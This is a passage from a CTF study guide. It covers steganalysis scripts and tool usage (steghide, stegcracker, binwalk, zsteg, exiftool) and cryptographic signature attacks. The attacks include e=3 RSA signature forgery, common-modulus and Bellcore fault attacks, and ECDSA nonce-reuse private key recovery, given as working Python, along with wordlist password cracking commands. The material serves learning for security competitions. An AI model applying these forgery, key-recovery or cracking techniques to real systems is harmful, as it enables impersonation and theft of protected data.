    for i in range(0, len(lsb_data) - block_size, block_size):
        block = lsb_data[i:i+block_size]
        ## Pack bits into bytes for entropy calculation
        bytes_block = np.packbits(block)
        entropy = calculate_entropy(bytes_block)
        entropy_values.append((i, entropy))
    
    print("Entropy Analysis by Block:")
    high_entropy_blocks = 0
    for pos, ent in entropy_values[:10]:  ## Show first 10 blocks
        print(f"  Block at {pos}: {ent:.4f} bits/byte")
        if ent > 7.5:  ## [Inference: Entropy > 7.5 suggests compressed/encrypted data]
            high_entropy_blocks += 1
    
    ## Estimate payload size based on high-entropy region
    if high_entropy_blocks > 0:
        estimated_blocks = high_entropy_blocks
        estimated_bytes = estimated_blocks * (block_size // 8)
        print(f"\n⚠ High entropy detected in {high_entropy_blocks} blocks")
        print(f"Estimated payload size: ~{estimated_bytes:,} bytes")
    else:
        print("\nNo significant high-entropy regions detected")
        print("Payload may be: (1) not present, (2) very small, or (3) uncompressed text")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <image_file>")
        sys.exit(1)
    estimate_payload_by_entropy(sys.argv[1])
```

#### Differential Analysis

Compare suspected stego files with known clean versions to estimate exact payload locations and size.

```bash
## Pixel-level difference analysis
python3 << EOF
from PIL import Image
import numpy as np

def differential_analysis(original_path, stego_path):
    img1 = np.array(Image.open(original_path))
    img2 = np.array(Image.open(stego_path))
    
    if img1.shape != img2.shape:
        print("⚠ Images have different dimensions")
        return
    
    ## Calculate differences
    diff = np.abs(img1.astype(int) - img2.astype(int))
    
    ## Count modified pixels
    modified = np.sum(diff > 0)
    total = diff.size
    
    print(f"Modified pixels: {modified:,} / {total:,} ({modified/total*100:.2f}%)")
    
    ## Estimate payload size
    ## [Inference: Assuming LSB embedding, each modified pixel can hide 1 bit per channel]
    if len(diff.shape) == 3:
        channels = diff.shape[2]
    else:
        channels = 1
    
    estimated_bits = modified * channels
    estimated_bytes = estimated_bits // 8
    
    print(f"Estimated payload: ~{estimated_bytes:,} bytes ({estimated_bytes/1024:.2f} KB)")
    
    ## Analyze modification patterns
    if len(diff.shape) == 3:
        for c in range(channels):
            channel_mods = np.sum(diff[:,:,c] > 0)
            print(f"  Channel {c}: {channel_mods:,} modifications")

## Usage
differential_analysis('original.png', 'stego.png')
EOF
```

#### Practical Payload Estimation Workflow

```bash
#!/bin/bash
## steganalysis_workflow.sh - Complete payload estimation pipeline

IMAGE="$1"

if [ ! -f "$IMAGE" ]; then
    echo "Usage: $0 <image_file>"
    exit 1
fi

echo "=== Steganalysis Workflow for $IMAGE ==="
echo

echo "[1] File Information"
file "$IMAGE"
exiftool "$IMAGE" | grep -E "Image Size|File Size"
echo

echo "[2] Statistical Detection"
## Run chi-square if available
if command -v stegdetect &> /dev/null; then
    stegdetect -t jopi "$IMAGE"
fi

## Run RS analysis if aletheia available
if command -v aletheia &> /dev/null; then
    aletheia rs "$IMAGE"
fi
echo

echo "[3] Capacity Calculation"
python3 lsb_capacity.py "$IMAGE"
echo

echo "[4] Length Header Extraction"
python3 extract_length_header.py "$IMAGE"
echo

echo "[5] Entropy Analysis"
python3 entropy_payload_estimation.py "$IMAGE"
echo

echo "[6] Trailing Data Check"
python3 -c "
with open('$IMAGE', 'rb') as f:
    data = f.read()
    
markers = {
    'JPEG': b'\xff\xd9',
    'PNG': b'IEND\xae\x42\x60\x82',
    'GIF': b'\x00\x3b'
}

for fmt, marker in markers.items():
    if marker in data:
        idx = data.rfind(marker)
        trailing = len(data) - (idx + len(marker))
        if trailing > 0:
            print(f'⚠ {trailing} bytes after {fmt} EOF marker')
"

echo
echo "=== Analysis Complete ==="
```

### Important CTF Tools for Steganalysis

```bash
## Install comprehensive steganalysis toolkit
apt-get update
apt-get install -y stegdetect steghide outguess stegsnow exiftool binwalk foremost

## Python-based tools
pip3 install stegano pillow numpy scipy scikit-image

## Build specialized tools
git clone https://github.com/b3dk7/StegExpose
cd StegExpose && ./configure && make && cd ..

git clone https://github.com/daniellerch/aletheia
cd aletheia && pip3 install -r requirements.txt && cd ..

## zsteg for PNG/BMP quick analysis (Ruby)
gem install zsteg
```

**Quick Analysis Command Reference**

```bash
## One-liner steganalysis attempts
zsteg -a suspicious.png                    ## All zsteg checks
stegdetect suspicious.jpg                   ## Statistical detection
steghide info suspicious.jpg                ## Check for steghide
binwalk -e suspicious.png                   ## Extract embedded files
foremost suspicious.png                     ## Carve hidden files
strings suspicious.png | grep -i flag      ## Quick string search
exiftool suspicious.png | grep -i comment  ## Metadata check
```

---

**Key Takeaways for CTF Steganalysis:**

1. **Statistical methods** detect presence but don't extract—use as first-pass screening
2. **Signature analysis** identifies specific tools, enabling targeted extraction
3. **Payload estimation** validates extraction attempts and prioritizes targets
4. **Entropy analysis** distinguishes encrypted/compressed payloads from random noise
5. **Always check trailing data** after format EOF markers—common hiding spot in CTFs
6. **Combine multiple techniques**—no single method catches all steganography types

[Inference: These methodologies are based on established steganalysis research but specific detection thresholds may require tuning for different image types and embedding rates]

---

## Tools

### steghide

**Purpose**: Steganography tool for embedding and extracting hidden data within image and audio files. Supports JPEG, BMP, WAV, and AU formats.

#### Core Functionality
`steghide` uses password-based encryption to hide data within cover files while maintaining file integrity and minimal visual/audible changes.

#### Installation
```bash
sudo apt install steghide
```

#### Basic Commands

**Embed data:**
```bash
steghide embed -cf cover_file.jpg -ef secret.txt
## -cf: cover file (carrier)
## -ef: embed file (data to hide)
## Prompts for passphrase
```

**Extract data:**
```bash
steghide extract -sf stego_file.jpg
## -sf: stego file (file containing hidden data)
## Prompts for passphrase
```

**Get info without extracting:**
```bash
steghide info stego_file.jpg
## Shows if file contains embedded data (requires passphrase)
```

#### Advanced Options

**Specify output file:**
```bash
steghide extract -sf stego_file.jpg -xf output.txt
```

**Use passphrase in command (non-interactive):**
```bash
steghide extract -sf stego_file.jpg -p "password123"
## WARNING: Insecure - password visible in process list
```

**Empty passphrase:**
```bash
steghide extract -sf stego_file.jpg -p ""
## Many CTF challenges use empty passphrases
```

**Embed with compression:**
```bash
steghide embed -cf cover.jpg -ef data.zip -z 9
## -z: compression level (1-9, 9=max)
```

**Force overwrite:**
```bash
steghide embed -cf cover.jpg -ef secret.txt -f
```

#### CTF Strategies

1. **Always try empty passphrase first** - common oversight
2. **Check file metadata** before extraction attempts
3. **Common weak passwords**: `password`, `admin`, `steghide`, filename-based
4. Combine with `stegcracker` for password attacks when passphrase is unknown

---

### stegcracker

**Purpose**: Brute-force password cracker for `steghide`-protected files using wordlist attacks.

#### Installation
```bash
sudo apt install stegcracker
```

**Alternative (pip):**
```bash
pip3 install stegcracker
```

#### Basic Usage

**With wordlist:**
```bash
stegcracker image.jpg /usr/share/wordlists/rockyou.txt
## Attempts all passwords from rockyou.txt
## On success, automatically extracts to image.jpg.out
```

**Default wordlist (rockyou.txt):**
```bash
stegcracker image.jpg
## Uses built-in rockyou.txt if available
```

#### Advanced Options

**Specify output file:**
```bash
stegcracker image.jpg wordlist.txt -o output.txt
```

**Verbose mode:**
```bash
stegcracker image.jpg wordlist.txt -v
## Shows each password attempt
```

#### Wordlist Recommendations

**Common CTF wordlists:**
```bash
/usr/share/wordlists/rockyou.txt          ## Most comprehensive
/usr/share/wordlists/fasttrack.txt        ## Smaller, faster
/usr/share/seclists/Passwords/            ## Various specialized lists
```

**Generate custom wordlist from challenge context:**
```bash
cewl http://challenge-url.com -d 2 -m 5 -w custom_wordlist.txt
## Scrapes words from target site
## -d: depth, -m: minimum word length
```

#### CTF Strategies

1. **Try empty password first manually** - faster than wordlist
2. **Use rockyou.txt as baseline** - covers ~14 million passwords
3. **Context-based wordlists**: Extract strings from challenge files, descriptions, images
4. **Hybrid approaches**: Combine found strings with common password patterns
5. Monitor extraction output - flag may appear in extracted filename or content

#### Performance Notes
- Average speed: 300-500 passwords/second (hardware-dependent)
- rockyou.txt full scan: ~8-12 hours
- Use smaller targeted wordlists when possible based on challenge hints

---

### stegsolve

**Purpose**: Java-based GUI tool for analyzing image files through multiple filters and bit-plane analysis. Primarily for visual steganography detection.

#### Installation

**Debian/Ubuntu:**
```bash
sudo apt install stegsolve
```

**Manual installation:**
```bash
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar
```

**[Inference]** Requires Java Runtime Environment (JRE):
```bash
sudo apt install default-jre
```

#### Running Stegsolve
```bash
stegsolve
## Opens GUI
```

**Load image via command:**
```bash
java -jar stegsolve.jar image.png
```

#### Core Features

##### 1. **Bit-Plane Analysis**
Cycles through color channels and bit planes:
- **Red/Green/Blue planes (0-7)**: Individual bit layers per channel
- **Alpha plane**: Transparency layer
- **Use arrow keys** to navigate between planes
- **Look for**: Hidden text, QR codes, patterns visible in specific bit planes

**Common discovery patterns:**
- LSB (Least Significant Bit) - plane 0 of each channel
- Text often hidden in Red/Green/Blue 0 planes
- Images embedded in higher bit planes (5-7)

##### 2. **Image Operations**
- **Analyse → Data Extract**: Extract data based on bit-plane selection
- **Analyse → Frame Browser**: For animated GIFs, browse individual frames
- **Analyse → Image Combiner**: XOR/ADD/SUB operations between two images
- **File → File Format**: Shows detailed file structure and metadata

##### 3. **Data Extraction Panel**

**Access:** Analyse → Data Extract

**Configuration:**
- **Bit order**: LSB/MSB first
- **Bit planes**: Select which planes to extract from (RGB/Alpha)
- **Preview**: Shows extracted data as text/binary
- **Save**: Export extracted data to file

**Common extraction patterns:**
```
Preview settings:
- LSB First
- All RGB planes enabled
- Check "Row order" vs "Column order"
```

##### 4. **Stereogram Solver**
For autostereogram challenges:
- File → Open → [stereogram image]
- Analyse → Stereogram Solve
- Adjusts depth perception to reveal hidden 3D images

#### CTF Workflow

**Standard analysis procedure:**

1. **Load image in stegsolve**
2. **Cycle through ALL bit planes** (arrow keys)
   - Full RGB cycle: Red 0-7, Green 0-7, Blue 0-7, Alpha 0-7
   - Look for text patterns, shapes, QR codes
3. **Check frame browser** (if animated format)
4. **Try data extraction** if patterns detected
5. **Image combiner** if multiple related images provided

**Common flag locations:**
- LSB of single color channel (Red 0, Green 0, Blue 0)
- Alpha channel (full transparency data)
- Specific frame in GIF/APNG
- XOR of two provided images

#### Limitations
- **GUI-only** - no command-line automation
- **Java dependency** - may have compatibility issues
- **Limited file format support** - primarily PNG, BMP, GIF, JPG
- For large-scale automation, consider `zsteg` or custom scripts

---

### binwalk

**Purpose**: Firmware analysis and file carving tool. Searches binary files for embedded files, filesystems, and executable code.

#### Installation
```bash
sudo apt install binwalk
```

**With extraction dependencies:**
```bash
sudo apt install binwalk sasquatch squashfs-tools
```

**Python installation (latest version):**
```bash
git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
sudo python3 setup.py install
```

#### Core Commands

**Basic signature scan:**
```bash
binwalk file.bin
## Lists all detected embedded files/signatures
```

**Extract all detected files:**
```bash
binwalk -e file.bin
## -e: extract
## Creates _file.bin.extracted/ directory
```

**Extract with deep recursion:**
```bash
binwalk -Me file.bin
## -M: recursively scan extracted files
## -e: extract
## Useful for nested archives/filesystems
```

**Display entropy analysis:**
```bash
binwalk -E file.bin
## -E: entropy graph
## High entropy = encrypted/compressed
## Low entropy = plaintext/repetitive data
```

**Save entropy graph:**
```bash
binwalk -E file.bin --save
## Creates file.bin.png entropy visualization
```

#### Advanced Usage

**Search for specific signatures:**
```bash
binwalk -y "zip" file.bin
## -y: match specific description string
```

**Raw extraction at specific offset:**
```bash
binwalk -e --dd='.*' file.bin --offset=0x1000 --length=0x5000
## --dd: raw extraction rule (regex)
## --offset: start position
## --length: bytes to extract
```

**Extract specific file types:**
```bash
binwalk --dd='zip archive' file.bin
## Only extracts ZIP files
```

**Manual extraction at known offset:**
```bash
dd if=file.bin of=extracted.zip bs=1 skip=$((0x1234))
## Use offsets from binwalk scan
```

#### Signature Analysis

**View all signatures:**
```bash
binwalk -S
## Lists all recognized signatures
```

**Quiet mode (offsets only):**
```bash
binwalk -q file.bin
## Minimal output
```

**Hexdump at detection points:**
```bash
binwalk -W file.bin
## Shows hexdump context around signatures
```

#### CTF-Specific Techniques

**1. Image file carving:**
```bash
binwalk -e suspicious.jpg
## Often reveals hidden ZIP/RAR archives
## Check _extracted/ for additional files
```

**2. Firmware extraction:**
```bash
binwalk -Me firmware.bin
## Common in IoT/hardware CTF challenges
## Look for SquashFS, JFFS2, CramFS filesystems
```

**3. Detect hidden archives:**
```bash
binwalk image.png | grep -i "zip\|rar\|7z\|gzip"
## Quick check for embedded compressed data
```

**4. Entropy-based detection:**
```bash
binwalk -E file.bin
## High entropy sections may indicate:
##   - Encrypted data
##   - Compressed archives
##   - Encoded content
```

**5. Combine with foremost:**
```bash
binwalk -e file.bin  ## First pass
foremost -i file.bin -o carved_files/  ## Second pass for missed files
```

#### Common Extraction Issues

**Problem: Extraction fails with error**
```bash
## Install missing dependencies
sudo apt install python3-lzma mtd-utils zlib1g-dev liblzma-dev
```

**Problem: Nested extraction stops early**
```bash
## Use maximum recursion
binwalk -Me --matryoshka=8 file.bin
## --matryoshka: recursion depth limit
```

**Problem: False positives in scan**
```bash
## Increase minimum signature strength
binwalk -% 75 file.bin
## -%: minimum match percentage (default 50)
```

#### Output Interpretation

**Sample output:**
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
30000         0x7530          Zip archive data, at least v2.0 to extract
```

**Key fields:**
- **DECIMAL/HEX**: Byte offset where signature detected
- **DESCRIPTION**: File type/filesystem identified
- Use offset values with `dd` for manual extraction

#### CTF Workflow

1. **Initial scan:** `binwalk file`
2. **Check entropy:** `binwalk -E file` (high entropy = investigate)
3. **Extract recursively:** `binwalk -Me file`
4. **Analyze extracted files:** Check `_extracted/` directory
5. **Manual extraction** if auto-extract fails: Use `dd` with reported offsets
6. **Strings analysis** on extracted files: `strings -n 8 extracted_file`

---

### Tool Combination Strategies

#### Multi-Tool Analysis Pipeline

**Image steganography workflow:**
```bash
## 1. Visual analysis
stegsolve image.jpg

## 2. Check for embedded files
binwalk -e image.jpg

## 3. Attempt steghide extraction (empty password)
steghide extract -sf image.jpg -p ""

## 4. If password-protected, brute force
stegcracker image.jpg rockyou.txt

## 5. Analyze extracted files
binwalk -Me _image.jpg.extracted/*
```

**Unknown file type approach:**
```bash
file unknown.bin             ## Identify file type
binwalk unknown.bin          ## Check for embedded files
strings unknown.bin | less   ## Look for readable text
hexdump -C unknown.bin | head  ## Examine raw bytes
steghide info unknown.bin    ## Check for steghide data
```

#### Important Subtopics

Consider exploring these related areas for comprehensive CTF steganography coverage:

- **Additional Tools**: `zsteg` (PNG/BMP LSB), `exiftool` (metadata), `foremost` (file carving), `outguess` (JPEG steg)
- **Manual Techniques**: Python scripting for LSB extraction, custom bit-plane analysis, pixel value manipulation
- **Audio Steganography**: Spectrum analysis (Audacity, `sonic-visualiser`), `steghide` for WAV files, DTMF/SSTV decoding
- **Format-Specific Techniques**: PDF layer analysis, GIF frame manipulation, polyglot file creation

---

### zsteg (PNG/BMP)

**Purpose**: Detects hidden data in PNG and BMP images using LSB (Least Significant Bit) steganography and other methods.

**Installation**:
```bash
gem install zsteg
```

**Core Commands**:

```bash
## Basic scan - tests all known methods
zsteg image.png

## Verbose output with all details
zsteg -a image.png

## Extract specific channel/bit configuration
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.txt

## Test specific bits (1-8)
zsteg --bits 1 image.png
zsteg --bits 2 image.png

## Limit search to specific channels
zsteg --channel r image.png  ## Red only
zsteg --channel g image.png  ## Green only
zsteg --channel b image.png  ## Blue only
zsteg --channel a image.png  ## Alpha only

## Scan for specific data types
zsteg --order xy image.png   ## Row-major order
zsteg --order yx image.png   ## Column-major order

## Search for strings only
zsteg --strings image.png
```

**Common LSB Notation**:
- `b1,rgb,lsb,xy` = 1 bit per channel, RGB channels, LSB extraction, row-major order
- `b2,bgr,msb,yx` = 2 bits per channel, BGR channels, MSB extraction, column-major order

**Practical Workflow**:
1. Run `zsteg -a image.png` and review all output
2. Look for readable text, file signatures (e.g., PK for ZIP, %PDF), or structured data
3. Extract promising payload using `-E` flag with exact specification from scan results
4. If extracted data appears compressed/encrypted, pipe through analysis tools

**Known Limitations**: 
- [Unverified] Effectiveness may vary with images using advanced steganography techniques beyond standard LSB methods
- Only supports PNG and BMP formats natively
- Large images may take significant processing time

---

### exiftool (Metadata)

**Purpose**: Reads, writes, and manipulates metadata in images and files. Critical for discovering hidden flags in EXIF/IPTC/XMP data.

**Installation**:
```bash
## Debian/Ubuntu/Kali
apt install libimage-exiftool-perl

## Verify installation
exiftool -ver
```

**Core Commands**:

```bash
## Display all metadata
exiftool image.jpg

## Show specific tag groups
exiftool -EXIF:all image.jpg
exiftool -IPTC:all image.jpg
exiftool -XMP:all image.jpg

## Recursive scan of directory
exiftool -r /path/to/images/

## Output to CSV for analysis
exiftool -csv -r /path/to/images/ > metadata.csv

## Search for specific keyword in metadata
exiftool -a -G1 -s image.jpg | grep -i "keyword"

## Extract thumbnail/preview images embedded in EXIF
exiftool -b -ThumbnailImage image.jpg > thumb.jpg
exiftool -b -PreviewImage image.jpg > preview.jpg

## Display in JSON format for parsing
exiftool -j image.jpg

## Show binary data fields (may contain hidden data)
exiftool -v3 image.jpg

## List only tag names without values
exiftool -s image.jpg

## Write/modify metadata (use cautiously in forensics)
exiftool -Comment="New comment" image.jpg
```

**CTF-Specific Techniques**:

1. **Check comment fields** - flags often hidden in:
   - `Comment`
   - `UserComment`
   - `ImageDescription`
   - `Artist`
   - `Copyright`

2. **Examine GPS data** - coordinates may encode clues:
   ```bash
   exiftool -GPS:all image.jpg
   ```

3. **Compare timestamps** - discrepancies may indicate manipulation:
   ```bash
   exiftool -time:all image.jpg
   ```

4. **Extract embedded files**:
   ```bash
   exiftool -b -PreviewImage photo.jpg > embedded.jpg
   binwalk -e embedded.jpg  ## Further analysis
   ```

5. **Diff metadata** between similar files:
   ```bash
   diff <(exiftool image1.jpg) <(exiftool image2.jpg)
   ```

**Common Metadata Fields for CTFs**:
- `Make` / `Model` - Camera information (may contain encoded text)
- `Software` - Processing software (check for custom strings)
- `ProcessingSoftware` - Additional processing metadata
- `Rating` / `Label` - Numeric/text ratings
- `OwnerName` - Owner information
- `SerialNumber` - Device serial (may encode data)

---

### jpegsnoop (JPEG Analysis)

**Purpose**: Deep analysis of JPEG internal structure, compression artifacts, and integrity verification. Detects manipulation and extracts embedded data.

**Installation**:
```bash
## Windows native tool - for Linux use Wine
apt install wine
## Download from https://github.com/ImpulseAdventure/JPEGsnoop
wine JPEGsnoop.exe

## Alternative Linux approach - use jpeginfo/jhead
apt install jpeginfo jhead
```

**[Inference] Core Analysis Capabilities** (based on documented JPEGsnoop features):

1. **Huffman Table Analysis** - Detects non-standard compression
2. **Quantization Tables** - Identifies quality settings and manipulation
3. **MCU (Minimum Coded Unit) Decoding** - Low-level structure inspection
4. **EXIF/JFIF Parsing** - Comprehensive header analysis
5. **Signature Database** - Matches camera/software signatures

**Linux Alternative Commands** (jpeginfo/jhead):

```bash
## Check JPEG integrity
jpeginfo -c image.jpg

## Detailed integrity with errors
jpeginfo -c -v image.jpg

## Extract EXIF with jhead
jhead image.jpg

## Display comment field
jhead -cs image.jpg

## Extract thumbnail
jhead -te thumb.jpg image.jpg

## Strip all metadata (forensics copy)
jhead -purejpg image.jpg
```

**Manual JPEG Structure Analysis**:

```bash
## View raw hex structure
xxd image.jpg | head -n 50

## Search for JPEG markers
xxd image.jpg | grep -E "ffd8|ffd9|ffe0|ffe1"

## Extract APP segments (may contain hidden data)
## FFE0 = JFIF, FFE1 = EXIF, FFE2 = ICC Profile
dd if=image.jpg bs=1 skip=<offset> count=<size> of=segment.bin
```

**JPEG Marker Reference** (critical for manual analysis):
- `FFD8` - Start of Image (SOI)
- `FFD9` - End of Image (EOI)
- `FFE0` - JFIF APP0
- `FFE1` - EXIF APP1
- `FFE2` - ICC Profile APP2
- `FFDB` - Define Quantization Table
- `FFC0` - Start of Frame (baseline DCT)
- `FFC4` - Define Huffman Table
- `FFDA` - Start of Scan
- `FFFE` - Comment segment (check for flags)

**CTF Workflow for JPEG Files**:

1. **Run exiftool first** - extract all metadata
2. **Check integrity** with jpeginfo
3. **Examine hex dump** for anomalies after FFD9 (EOI marker)
   ```bash
   xxd image.jpg | grep -A 10 "ffd9"
   ```
4. **Extract trailing data** (common hiding spot):
   ```bash
   ## Find EOI marker offset
   grep -abo $'\xFF\xD9' image.jpg | tail -1
   ## Extract everything after EOI
   dd if=image.jpg bs=1 skip=<eoi_offset+2> of=trailing.bin
   ```
5. **Analyze with binwalk** for embedded files:
   ```bash
   binwalk -e image.jpg
   ```

**Known Manipulation Detection**:
- **Resaved at different quality** - Compare quantization tables
- **Copy-paste regions** - Analyze compression artifacts [Inference]
- **Metadata stripped then rewritten** - Check field consistency
- **Double JPEG compression** - Detectable via quantization analysis [Inference]

---

### Cross-Tool Integration Workflow

**Comprehensive CTF Image Analysis Pipeline**:

```bash
#!/bin/bash
TARGET=$1

echo "[*] Running exiftool..."
exiftool -a -G1 $TARGET

echo "[*] Running zsteg (if PNG/BMP)..."
zsteg -a $TARGET 2>/dev/null

echo "[*] Checking integrity..."
jpeginfo -c $TARGET 2>/dev/null || file $TARGET

echo "[*] Running binwalk..."
binwalk $TARGET

echo "[*] Extracting trailing data..."
xxd $TARGET | tail -n 20

echo "[*] Strings analysis..."
strings $TARGET | grep -E "[a-zA-Z0-9+/]{20,}|flag|ctf|key" | head -n 20
```

**Important Subtopics to Master**:
- LSB Steganography Theory (bit planes, extraction orders)
- JPEG Compression Fundamentals (DCT, quantization, Huffman coding)
- File Format Specifications (PNG chunks, JPEG segments, BMP structure)
- Hex Editing Techniques for manual inspection

---

# DIGITAL SIGNATURES & CERTIFICATES

## Digital Signature Schemes

Digital signature schemes provide authentication, integrity, and non-repudiation in cryptographic systems. In CTF contexts, vulnerabilities in signature implementations often arise from poor key generation, parameter reuse, weak random number generators, or mathematical weaknesses in the underlying algorithms.

### RSA Signatures

RSA signatures rely on the mathematical relationship between public and private exponents with modular arithmetic. The signer uses their private key (d, n) to create a signature, and verifiers use the public key (e, n) to validate it.

#### Basic RSA Signature Scheme

**Standard RSA signature process:**
```bash
## Signing: S = M^d mod n (where M is the message hash)
## Verification: M = S^e mod n
```

The signature scheme typically follows PKCS#1 v1.5 or PSS (Probabilistic Signature Scheme) padding standards.

#### Common RSA Signature Vulnerabilities in CTFs

**1. Low Public Exponent Signature Forgery**

When e=3 and improper padding is used, attackers can forge signatures:

```python
from Crypto.Util.number import *
import gmpy2

## If signature verification doesn't check padding properly
## and uses S^3 = M (without mod n), compute cube root
def forge_signature(message):
    ## For messages where M^(1/3) is an integer
    signature = gmpy2.iroot(message, 3)[0]
    return signature
```

**Tool: RsaCtfTool for signature analysis**
```bash
## Install
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt

## Analyze public key for weaknesses
python3 RsaCtfTool.py --publickey pubkey.pem --verbose

## Attempt to crack private key (various attacks)
python3 RsaCtfTool.py --publickey pubkey.pem --private
```

**2. Bleichenbacher's Attack on PKCS#1 v1.5 Signatures**

When signature verification is implemented incorrectly, attackers can craft valid-looking signatures for arbitrary messages.

```python
## Basic structure exploitation
## Target: Forge signature where verification accepts malformed padding
## Format: 0x00 0x01 [padding] 0x00 [digest info] [hash]

def craft_bleichenbacher_sig(n, hash_value):
    ## Construct: 0001FF...FF00[ASN.1 HASH][hash][garbage]
    ## Then take cube root for e=3
    from hashlib import sha256
    
    ## ASN.1 DigestInfo for SHA-256
    asn1_sha256 = bytes.fromhex('3031300d060960864801650304020105000420')
    
    forge = b'\x00\x01' + b'\xff' * 8 + b'\x00' + asn1_sha256 + hash_value
    forge = forge + b'\x00' * (len(n.to_bytes((n.bit_length()+7)//8, 'big')) - len(forge))
    
    return gmpy2.iroot(int.from_bytes(forge, 'big'), 3)[0]
```

**3. Common Modulus Attack on Signatures**

If two users share the same modulus n but have different exponents, and you intercept signatures from both:

```python
import gmpy2

def common_modulus_signature_attack(n, e1, e2, s1, s2, message):
    ## If gcd(e1, e2) = 1, use extended Euclidean algorithm
    gcd, a, b = gmpy2.gcdext(e1, e2)
    
    if gcd != 1:
        return None
    
    ## Compute message: M = (s1^a * s2^b) mod n
    if a < 0:
        s1 = gmpy2.invert(s1, n)
        a = -a
    if b < 0:
        s2 = gmpy2.invert(s2, n)
        b = -b
    
    result = (pow(s1, a, n) * pow(s2, b, n)) % n
    return result
```

**4. Fault Attacks (Bellcore Attack)**

If you can obtain both a correct signature and a faulty signature of the same message:

```python
def bellcore_attack(n, correct_sig, faulty_sig):
    ## Factor n using difference of signatures
    import math
    diff = abs(correct_sig - faulty_sig)
    p = math.gcd(diff, n)
    
    if 1 < p < n:
        q = n // p
        return p, q
    return None, None
```

#### RSA Signature Tools and Commands

**OpenSSL for signature operations:**
```bash
## Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

## Sign a file
openssl dgst -sha256 -sign private.pem -out signature.bin message.txt

## Verify signature
openssl dgst -sha256 -verify public.pem -signature signature.bin message.txt

## Extract key parameters
openssl rsa -in private.pem -text -noout
openssl rsa -pubin -in public.pem -text -noout
```

**Python with PyCryptodome:**
```python
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

## Load key
key = RSA.import_key(open('private.pem').read())

## Sign
h = SHA256.new(b"message")
signature = pkcs1_15.new(key).sign(h)

## Verify
public_key = RSA.import_key(open('public.pem').read())
try:
    pkcs1_15.new(public_key).verify(h, signature)
    print("Valid signature")
except (ValueError, TypeError):
    print("Invalid signature")
```

**Recovering message from signature (when possible):**
```python
from Crypto.Util.number import *

def extract_from_signature(signature, e, n):
    ## Compute S^e mod n to get padded message
    padded = pow(signature, e, n)
    return long_to_bytes(padded)
```

### ECDSA (Elliptic Curve Digital Signature Algorithm)

ECDSA provides signatures using elliptic curve cryptography. It offers smaller key sizes with equivalent security to RSA. The signature consists of two values (r, s) derived from the message hash and a random nonce k.

#### ECDSA Mathematics

**Signature generation:**
```
1. Select random k (1 < k < n, where n is curve order)
2. Calculate point (x, y) = k * G (G is generator point)
3. r = x mod n
4. s = k^(-1) * (H(m) + r * d) mod n (d is private key)
5. Signature is (r, s)
```

**Verification:**
```
1. w = s^(-1) mod n
2. u1 = H(m) * w mod n
3. u2 = r * w mod n
4. (x, y) = u1 * G + u2 * Q (Q is public key)
5. Valid if r == x mod n
```

#### Critical ECDSA Vulnerabilities

**1. Nonce Reuse Attack (Most Common)**

If the same k is used for two different messages, the private key can be recovered:

```python
from Crypto.Util.number import inverse

def ecdsa_nonce_reuse(r, s1, s2, h1, h2, n):
    """
    r: shared r value from both signatures
    s1, s2: signature s values
    h1, h2: message hashes
    n: curve order
    """
    ## Calculate k
    k = ((h1 - h2) * inverse(s1 - s2, n)) % n
    
    ## Calculate private key d
    d = ((s1 * k - h1) * inverse(r, n)) % n
    
    return d, k
```

**Automated nonce reuse detection:**
```python
def detect_nonce_reuse(signatures):
    """
    signatures: list of (r, s, hash) tuples
    Returns pairs of signatures with same r value
    """
    r_values = {}
    reused = []
    
    for i, (r, s, h) in enumerate(signatures):
        if r in r_values:
            reused.append((r_values[r], i))
        else:
            r_values[r] = i
    
    return reused
```

**2. Biased Nonce Attack**

When k has known bits or is generated from weak RNG:

```python
## Example: If some MSBs of k are known
## Tool: LLL lattice reduction attack
## Use https://github.com/josephsurin/lattice-based-cryptanalysis

from sage.all import *

def biased_k_attack(signatures, known_bits, n, q):
    """
    [Inference] This attack uses lattice reduction when partial nonce info is known
    Requires SageMath
    """
    ## Build lattice matrix
    ## [Unverified] - specific implementation depends on bias type
    pass  ## Full implementation requires SageMath environment
```

**3. Invalid Curve Attack**

If ECDSA implementation doesn't validate that points are on the curve:

```python
def invalid_curve_attack():
    """
    Send points on different curves with known/weak orders
    Recover private key through solving multiple congruences
    """
    ## [Inference] Attack strategy:
    ## 1. Generate invalid curves with small subgroup orders
    ## 2. Submit signatures using points on these curves
    ## 3. Use Chinese Remainder Theorem to recover d mod (product of orders)
    pass  ## Requires curve parameter manipulation
```

**4. Small Subgroup Attack**

Exploit curves with composite orders:

```bash
## Use ecgen tool to analyze curve properties
git clone https://github.com/J08nY/ecgen
cd ecgen
make

## Check curve subgroups
./ecgen -q <prime> -c <cofactor> -n <order>
```

#### ECDSA Tools and Commands

**OpenSSL ECDSA operations:**
```bash
## List available curves
openssl ecparam -list_curves

## Generate ECDSA key (secp256k1 - Bitcoin curve)
openssl ecparam -name secp256k1 -genkey -noout -out ec-private.pem
openssl ec -in ec-private.pem -pubout -out ec-public.pem

## Sign with ECDSA
openssl dgst -sha256 -sign ec-private.pem -out signature.der message.txt

## Verify ECDSA signature
openssl dgst -sha256 -verify ec-public.pem -signature signature.der message.txt

## Extract curve parameters
openssl ecparam -in ec-private.pem -text -noout
```

**Python with ecdsa library:**
```python
import ecdsa
from hashlib import sha256

## Generate key
sk = ecdsa.SigningKey.generate(curve=ecdsa.SECP256k1, hashfunc=sha256)
vk = sk.get_verifying_key()

## Sign
message = b"message"
signature = sk.sign(message)

## Verify
try:
    vk.verify(signature, message)
    print("Valid")
except ecdsa.BadSignatureError:
    print("Invalid")

## Extract r, s from DER signature
from ecdsa.util import sigdecode_der
r, s = sigdecode_der(signature, sk.curve.order)
```

**Extract ECDSA parameters from signature:**
```python
def parse_ecdsa_der(der_sig):
    """Parse DER-encoded ECDSA signature"""
    from ecdsa.util import sigdecode_der
    import ecdsa
    
    ## Common curves
    curves = [ecdsa.SECP256k1, ecdsa.NIST256p, ecdsa.SECP384r1]
    
    for curve in curves:
        try:
